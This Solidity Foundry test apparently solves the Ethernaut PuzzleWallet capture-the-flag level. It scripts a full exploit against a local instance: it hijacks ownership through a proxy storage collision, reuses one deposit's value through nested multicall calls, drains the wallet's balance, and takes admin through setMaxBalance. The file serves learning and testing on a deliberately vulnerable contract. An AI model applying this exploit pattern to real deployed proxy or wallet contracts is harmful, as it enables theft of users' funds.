// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/24-PuzzleWallet/PuzzleWalletFactory.sol";
import "../src/Ethernaut.sol";

contract PuzzleWalletTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);
    bytes[] depositData;
    bytes[] multicallData;

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);
    }

    function testPuzzleWalletHack() public {
        // Level setup
        PuzzleWalletFactory puzzleWalletFactory = new PuzzleWalletFactory();
        ethernaut.registerLevel(puzzleWalletFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 2 ether}(puzzleWalletFactory);
        PuzzleProxy ethernautPuzzleProxy = PuzzleProxy(payable(levelAddress));
        PuzzleWallet ethernautPuzzleWallet = PuzzleWallet(levelAddress);  //same address

        // Level attack
        // Sets owner because delegatecall on implementation and stuff
        ethernautPuzzleProxy.proposeNewAdmin(eoaAddress);
        emit log_named_address("Owner", ethernautPuzzleWallet.owner());
    
        // whitelist eoaAddress and wallet
        ethernautPuzzleWallet.addToWhitelist(eoaAddress);
        ethernautPuzzleWallet.addToWhitelist(levelAddress);

        // +1 because 1 ether will be sent with the call
        uint256 depositCalls = address(ethernautPuzzleProxy).balance / (1 ether) + 1;
        bytes memory depositSignature = abi.encodeWithSignature("deposit()");
        depositData.push(depositSignature);
        multicallData.push(depositSignature);

        emit log_named_uint("DepositCalls", depositCalls);

        for (uint i = 1; i < depositCalls; i++) {
            multicallData.push(abi.encodeWithSignature("multicall(bytes[])", depositData));
        }

        // Set eoaAddress balance to proxy.balance
        ethernautPuzzleWallet.multicall{value: 1 ether}(multicallData);

        // Drain funds
        ethernautPuzzleWallet.execute(eoaAddress, address(ethernautPuzzleProxy).balance, "");

        // Set admin through maxBalance
        ethernautPuzzleWallet.setMaxBalance(uint256(uint160(bytes20(eoaAddress))));

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}